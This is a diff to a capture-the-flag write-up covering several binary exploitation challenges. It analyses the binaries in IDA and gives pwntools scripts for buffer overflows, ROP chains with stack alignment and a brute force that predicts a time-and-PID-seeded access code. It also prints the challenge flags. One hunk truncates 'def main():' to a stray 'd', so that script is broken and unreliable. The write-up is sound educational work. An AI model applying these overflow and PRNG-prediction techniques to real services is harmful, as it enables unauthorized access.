@@ -29,12 +29,16 @@ Option 3: Log into my binary!
 
 ## Vulnerability analsyis
  1. Opening the file in IDA<br>
-  <img width="1069" height="494" alt="image" src="https://github.com/user-attachments/assets/7cea639d-56bf-4124-a15d-6963a14f12af" /> <br>
+ 
+   <img width="1069" height="494" alt="image" src="https://github.com/user-attachments/assets/7cea639d-56bf-4124-a15d-6963a14f12af" /> <br>
+  
  2. After user input handleoption() is called <Br>
+ 
   <img width="695" height="692" alt="image" src="https://github.com/user-attachments/assets/771ef596-3a7b-467c-99e5-c31f15a7c506" /> <Br>
+  
  4. The program is designed to store user input as an array, and loop through the respective options<br>
  5. printFlag() func will not be called if "2" is the first element of the user<br>
- 6. The input prompt (v1) should follow the constraints v1>0 v1<=3 <br>
+ 6. The input prompt (v1) should follow the constraints v1> 0& v1<=3 <br>
 
 ## Exploit strat
 - Sending input with "2" not as the first element, so anything like "123" "321" "!23" will work and print the flag
@@ -79,11 +83,15 @@ Your custom buffer:
 
 ## Vulnerability analsyis
 1. Opening the file in IDA<br>
+
  <img width="685" height="372" alt="image" src="https://github.com/user-attachments/assets/34c1fcb6-49b6-4b84-a423-1168499a1de9" />
 <br>
- 2. analyzing win() in the disassembler<Br>
+
+2. Analyzing win() in the disassembler<Br>
+
  <img width="522" height="216" alt="image" src="https://github.com/user-attachments/assets/eb3ccc51-a162-42a9-ac18-d1f973e07d5e" />
  <Br>
+ 
 3. The program will print the flag when we execute the win() func using buffer overflow<br>
 
 
@@ -106,7 +114,7 @@ PRINTFLAG = 0x4011E9
 REMOTE_HOST = "performative.nitephase.live"
 REMOTE_PORT = 56743
 
-def main():
+d
     p = remote(REMOTE_HOST, REMOTE_PORT)
     log.info("Connected to remote server")
     
@@ -117,8 +125,6 @@ def main():
 
     p.interactive()
 
-if __name__ == "__main__":
-    main()
 ```
 
 ```
@@ -157,11 +163,13 @@ Enter the amount for customizations: 1212
 
 ## Vulnerability analsyis
 1. Opening the file in IDA<br>
-<img width="757" height="230" alt="image" src="https://github.com/user-attachments/assets/a782aaed-fc98-4e91-bae6-a3782002778e" />
+
+ <img width="757" height="230" alt="image" src="https://github.com/user-attachments/assets/a782aaed-fc98-4e91-bae6-a3782002778e" />
 
 <br>
  2. analyzing vuln() in IDA<Br>
-<img width="616" height="336" alt="image" src="https://github.com/user-attachments/assets/3b1f8fd5-ab68-478a-87ea-7447147542d9" />
+ 
+ <img width="616" height="336" alt="image" src="https://github.com/user-attachments/assets/3b1f8fd5-ab68-478a-87ea-7447147542d9" />
 
  <Br>
  3. Plain old buffer overflow it is. Or is it?
@@ -177,7 +185,7 @@ Enter the amount for customizations: 1212
 - The program segafaults but why?
 - Stack misalignment
 - Stack needs to be 16bit aligned
-- When we simply overflow the stack we end up messing up the stack structure and register values making the stack look like a "murder scene" , chaotic.
+- When we simply overflow the stack we end up messing up the stack structure and register values making the stack look like a "murder scene" .
 - We need to fix this error by aliging the stack . "Rudimentary" application of ROP.
 
 ### Exploit script
@@ -275,7 +283,9 @@ Lesson 1: For your first challenge you have to simply jump to the function at th
 ## Vulnerability analsyis
  1. Opening the file in IDA<br>
  2. analyzing win1() in IDA<Br>
-<img width="1139" height="645" alt="image" src="https://github.com/user-attachments/assets/1fec8d1c-f291-422c-9c40-8522de9fcc8f" />
+ 
+  <img width="1139" height="645" alt="image" src="https://github.com/user-attachments/assets/1fec8d1c-f291-422c-9c40-8522de9fcc8f" />
+  
  <Br>
  3. Plain old buffer overflow it is. Or is it?
 
@@ -293,7 +303,9 @@ Lesson 2 Arguments: Research how arguments are passed to functions and apply you
 Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?} <Br>
 ```
 1.  Analyzing win2() in IDA<BR>
-<img width="436" height="136" alt="image" src="https://github.com/user-attachments/assets/b4ea5ee5-a7eb-463b-bac2-3f671db00fe4" />
+
+ <img width="436" height="136" alt="image" src="https://github.com/user-attachments/assets/b4ea5ee5-a7eb-463b-bac2-3f671db00fe4" />
+ 
 <br>
 2. Calculating offset by viewing the the RBP val. <Br>
 3. offset: 0x20 + 0x08 = 0x28 = 40bytes <Br>
@@ -307,7 +319,9 @@ You have done well, however you still have one final test. You must now bring 3 
 nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)
 ```
 - Win3()
-  <img width="547" height="187" alt="image" src="https://github.com/user-attachments/assets/c1aa8b83-ccf5-4fba-aeb2-b20bb6e247b3" />
+  
+   <img width="547" height="187" alt="image" src="https://github.com/user-attachments/assets/c1aa8b83-ccf5-4fba-aeb2-b20bb6e247b3" />
+   
 <br>
 1. Again via RBP calculating offset for win2() : 0x30 + 0x08 = 0x38 = 56 bytes
 2. Win3() function needs 3 arguments so we need to pop the respective values inside RDI RSI AND RDX and then make an ROP chain again and send to function <br>
@@ -449,13 +463,13 @@ What would you like on your Bit Burger?
 ## Vulnerability analsyis
  1. Opening the file in IDA<br>
 
-<img width="630" height="501" alt="image" src="https://github.com/user-attachments/assets/09c4a1e7-3e01-497d-b06d-693b692c909b" />
+  <img width="630" height="501" alt="image" src="https://github.com/user-attachments/assets/09c4a1e7-3e01-497d-b06d-693b692c909b" />
 
  <Br>
   2. We have to enter "$" to get access to manager_control_panel() then proceed
   3. analyzing managar_control_panel() in IDA<Br>
  
-<img width="503" height="401" alt="image" src="https://github.com/user-attachments/assets/61347594-5267-487f-aa10-6509e66aec24" />
+  <img width="503" height="401" alt="image" src="https://github.com/user-attachments/assets/61347594-5267-487f-aa10-6509e66aec24" />
 <Br>
 
 
@@ -481,51 +495,55 @@ PORT = 53791
 # Load libc for rand()
 libc = CDLL('libc.so.6')
 
-def exploit():
-    # Try different time offsets and PID ranges
-    base_time = int(time.time())
-    
-        
-        # Try PIDs in reasonable range
-        for pid in range(1, 5000):
-            io = None
-            try:
-                io = remote(HOST, PORT)
-                
-                io.recvuntil(b'a bun (y/n)?')
-                io.sendline(b'$')
-                
-                seed = current_time ^ pid
-                libc.srand(seed)
-                code = libc.rand() % 1000000
-                
-                if pid % 100 == 0:
-                    log.info(f"Trying PID {pid}, code: {code}")
-                
-                io.recvuntil(b'Enter manager access code: ')
-                io.sendline(str(code).encode())
-                
-                # Check response
-                response = io.recvline(timeout=1)
-                
-                if b"Access granted" in response:
-                    log.success(f"Success! Time: {current_time}, PID: {pid}, Code: {code}")
-                    log.info("Dropping to interactive shell...")
-                    io.interactive()
-                    return True
-                
-                io.close()
-                
-            except Exception as e:
-                if io:
-                    io.close()
-                continue
-    
-    log.error("Failed to find correct code")
-    return False
+context.log_level = 'info'
 
-if __name__ == '__main__':
-    exploit()  
+
+def main():
+    current_time = int(time.time())
+
+    for pid in range(1, 5000):
+        io = None
+        try:
+            io = remote(HOST, PORT)
+
+            io.recvuntil(b'a bun (y/n)?')
+            io.sendline(b'$')
+
+            seed = current_time ^ pid
+            libc.srand(seed)
+            code = libc.rand() % 1000000
+
+            if pid % 100 == 0:
+                log.info(f"Trying PID {pid}, code: {code}")
+
+            io.recvuntil(b'Enter manager access code: ')
+            io.sendline(str(code).encode())
+
+            response = io.recvline(timeout=1)
+
+            if response and b"Access granted" in response:
+                log.success(
+                    f"Success! Time: {current_time}, PID: {pid}, Code: {code}"
+                )
+                log.info("Dropping to interactive shell...")
+                io.interactive()
+                return
+
+            io.close()
+
+        except Exception as e:
+            if io:
+                io.close()
+            continue
+
+    log.error("Failed to find correct code")
+
+
+if __name__ == "__main__":
+    main()
+
+
+
 
 ```
 ```bash
@@ -588,5 +606,5 @@ nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
 
 ```
 ## Resources:
-.
+Aryan :3 
 
